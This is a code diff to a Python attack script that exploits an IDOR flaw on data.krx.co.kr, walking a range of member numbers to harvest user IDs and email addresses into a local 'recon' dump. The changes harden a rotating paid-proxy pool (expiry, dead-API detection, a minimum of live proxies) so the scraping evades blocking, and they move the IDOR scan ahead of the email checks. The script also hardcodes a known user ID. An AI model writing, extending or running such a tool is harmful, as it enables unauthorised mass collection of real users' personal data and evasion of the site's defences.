@@ -16,7 +16,7 @@ import threading
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Any
-from urllib.parse import urlparse, urlunparse
+from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
 import requests
 
@@ -46,10 +46,15 @@ UA = (
 )
 START = int(os.environ.get("KRX_START", "2000005000"))
 END = int(os.environ.get("KRX_END", "2000223000"))
-WORKERS = int(os.environ.get("KRX_WORKERS", "10"))
+WORKERS = int(os.environ.get("KRX_WORKERS", "6"))
 OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
 STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
 PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
+# IPs live 3–15 min; drop at 150s so we never sit on a dead one.
+PROXY_TTL = int(os.environ.get("KRX_PROXY_TTL", "150"))
+EXTRACT_COUNT = int(os.environ.get("KRX_EXTRACT_COUNT", "2"))
+KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "4"))
+EXTRACT_DEAD_HINTS = ("用完", "不足", "余额", "过期", "失效", "次数已", "提取失败", "订单不存在", "INVALID")
 CLOUD_GOOD_FROM = 2000005966
 KNOWN_MBR = 2000008331
 KNOWN_ID = "ryujt"
@@ -59,6 +64,20 @@ _tls = threading.local()
 _lock = threading.Lock()
 _stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}
 POOL: "ProxyPool | None" = None
+
+
+def with_extract_count(url: str, n: int) -> str:
+    p = urlparse(url)
+    q = dict(parse_qsl(p.query, keep_blank_values=True))
+    q["count"] = str(n)
+    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(q), p.fragment))
+
+
+def extract_is_dead(text: str) -> bool:
+    t = text or ""
+    if not t:
+        return False
+    return any(h in t for h in EXTRACT_DEAD_HINTS)
 
 
 def panda_urls() -> list[str]:
@@ -202,6 +221,9 @@ class ProxyPool:
         self.good: list[str] = []
         self.bad: set[str] = set()
         self.strikes: dict[str, int] = {}
+        self.born: dict[str, float] = {}
+        self.dead_urls: set[str] = set()
+        self.empty_streak: dict[str, int] = {}
         self.last_fetch = 0.0
         self.ui = 0
         self.i = 0
@@ -209,9 +231,37 @@ class ProxyPool:
         self.allow_direct = not self.urls
         if self.static and not self.urls:
             self.proxies = [self.static]
+            self.born[self.static] = time.time()
+
+    def _alive_urls(self) -> list[str]:
+        return [u for u in self.urls if u not in self.dead_urls]
+
+    def _fresh(self, proxy: str) -> bool:
+        if proxy in self.bad:
+            return False
+        return (time.time() - self.born.get(proxy, 0)) < PROXY_TTL
+
+    def live_list(self) -> list[str]:
+        return [p for p in self.proxies if self._fresh(p)]
 
     def live_n(self) -> int:
-        return len([p for p in self.proxies if p not in self.bad])
+        return len(self.live_list())
+
+    def _expire_old(self) -> None:
+        now = time.time()
+        dead = [p for p, t0 in self.born.items() if now - t0 >= PROXY_TTL]
+        for p in dead:
+            self.bad.add(p)
+            if p in self.good:
+                self.good.remove(p)
+
+    def _next_url(self) -> str | None:
+        alive = self._alive_urls()
+        if not alive:
+            return None
+        url = alive[self.ui % len(alive)]
+        self.ui += 1
+        return url
 
     def fetch(self) -> None:
         if not self.urls:
@@ -220,61 +270,83 @@ class ProxyPool:
             time.sleep(0.2)
             return
         try:
+            if self.live_n() >= KEEP_LIVE:
+                return
+            url = self._next_url()
+            if url is None:
+                print("api_exhausted all extract URLs used up", flush=True)
+                time.sleep(2)
+                return
             wait = 1.3 - (time.time() - self.last_fetch)
             if wait > 0:
                 time.sleep(wait)
-            url = self.urls[self.ui % len(self.urls)]
-            self.ui += 1
+            get_url = with_extract_count(url, EXTRACT_COUNT)
             try:
-                r = requests.get(url, timeout=15)
+                r = requests.get(get_url, timeout=15)
                 self.last_fetch = time.time()
-                got = parse_extract_body(r.text, self.extra_auth)
-            except Exception:
+                text = r.text
+            except Exception as e:
                 self.last_fetch = time.time()
-                got = []
-            if not got:
+                print(f"extract_err {type(e).__name__}", flush=True)
                 return
+            if extract_is_dead(text):
+                self.dead_urls.add(url)
+                print(f"api_dead {url.split('orderNo=')[-1][:28]} {text[:80].replace(chr(10),' ')}", flush=True)
+                return
+            got = parse_extract_body(text, self.extra_auth)
+            if not got:
+                n = self.empty_streak.get(url, 0) + 1
+                self.empty_streak[url] = n
+                if n >= 3:
+                    self.dead_urls.add(url)
+                    print(f"api_dead_empty {url.split('orderNo=')[-1][:28]}", flush=True)
+                return
+            self.empty_streak[url] = 0
+            now = time.time()
             with _lock:
                 for p in got:
                     if p not in self.proxies:
                         self.proxies.append(p)
                     self.bad.discard(p)
                     self.strikes.pop(p, None)
-                if len(self.proxies) > 30:
-                    keep = set(self.good) | set(got)
-                    self.proxies = [p for p in self.proxies if p in keep][-30:]
-            print(f"proxy_pool +{len(got)} live={self.live_n()} good={len(self.good)}", flush=True)
+                    self.born[p] = now
+                self._expire_old()
+            print(
+                f"proxy_pool +{len(got)} live={self.live_n()} good={len([p for p in self.good if self._fresh(p)])} "
+                f"apis={len(self._alive_urls())}/{len(self.urls)}",
+                flush=True,
+            )
         finally:
             self._fetch_lock.release()
 
     def fetch_all(self) -> None:
-        for _ in list(self.urls):
+        for _ in list(self._alive_urls()):
             self.fetch()
 
     def pick(self) -> str | None:
         for _ in range(12):
             with _lock:
-                prefer = [p for p in self.good if p not in self.bad]
-                live = prefer or [p for p in self.proxies if p not in self.bad]
+                self._expire_old()
+                prefer = [p for p in self.good if self._fresh(p)]
+                live = prefer or self.live_list()
             if live:
                 with _lock:
                     self.i += 1
                     return live[self.i % len(live)]
+            if not self._alive_urls():
+                time.sleep(1)
+                continue
             self.fetch()
         if self.allow_direct:
             return self.static or None
-        self.fetch()
-        with _lock:
-            live = [p for p in self.good + self.proxies if p not in self.bad]
-            if live:
-                self.i += 1
-                return live[self.i % len(live)]
         return None
 
     def ok(self, proxy: str | None) -> None:
         if not proxy:
             return
         with _lock:
+            if not self._fresh(proxy):
+                return
             self.strikes.pop(proxy, None)
             self.bad.discard(proxy)
             if proxy not in self.good:
@@ -297,8 +369,8 @@ class ProxyPool:
                     self.bad.add(proxy)
                     if proxy in self.good:
                         self.good.remove(proxy)
-            live = len([p for p in self.proxies if p not in self.bad])
-        if live < 3:
+            live = len(self.live_list())
+        if live < KEEP_LIVE:
             self.fetch()
 
 
@@ -399,7 +471,7 @@ def one_idor(mno: int) -> tuple[int, str | None, str | None]:
             mid = mbr_id(mno)
             if not mid:
                 return mno, None, None
-            return mno, mid, dup_email(mid, DOMS_PRIMARY + DOMS_EXTRA)
+            return mno, mid, dup_email(mid, DOMS_PRIMARY)
         except Exception:
             with _lock:
                 _stats["err"] += 1
@@ -608,7 +680,7 @@ def main() -> None:
         pool.fetch_all()
 
     mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
-    idor_jobs = head + tail + holes
+    idor_jobs = tail + head + holes
     total = len(mail_jobs) + len(idor_jobs)
     print(
         f"workers={WORKERS} mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
@@ -676,14 +748,14 @@ def main() -> None:
     chunk = 80
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
         i = 0
-        while i < len(mail_jobs):
-            batch = mail_jobs[i : i + chunk]
-            run_batch([ex.submit(one_mail, n, mid) for n, mid in batch], "mail")
-            i += chunk
-        i = 0
         while i < len(idor_jobs):
             batch = idor_jobs[i : i + chunk]
             run_batch([ex.submit(one_idor, n) for n in batch], "idor")
+            i += chunk
+        i = 0
+        while i < len(mail_jobs):
+            batch = mail_jobs[i : i + chunk]
+            run_batch([ex.submit(one_mail, n, mid) for n, mid in batch], "mail")
             i += chunk
 
     ef.close()
